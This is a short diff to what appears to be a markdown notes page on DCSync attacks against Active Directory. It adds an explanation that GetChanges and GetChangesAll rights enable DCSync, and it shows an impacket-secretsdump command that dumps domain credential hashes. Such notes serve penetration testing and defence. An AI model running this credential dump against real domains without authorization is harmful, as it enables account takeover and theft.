@@ -20,10 +20,13 @@ Get-ObjectAcl "DC=yourdomain,DC=com" -ResolveGUIDs |
 <img width="1443" height="115" alt="image" src="https://github.com/user-attachments/assets/be6df894-74e1-44c5-9e06-c1ed39261fc3" />
 
 ### Using BloodHound
-
+These two permissions (GetChanges + GetChangesAll) allow a principal to perform a DCSync attack.
+<img width="2314" height="523" alt="image" src="https://github.com/user-attachments/assets/ee425556-d0cd-4920-b600-e865d618f465" />
 
 ## DCSync Attack from Linux (Non-Domain Machine)
 
 ```shell
 impacket-secretsdump -just-dc-user <username> <domain>/<admin_user>:<password>@<dc_ip>
 ```
+
+
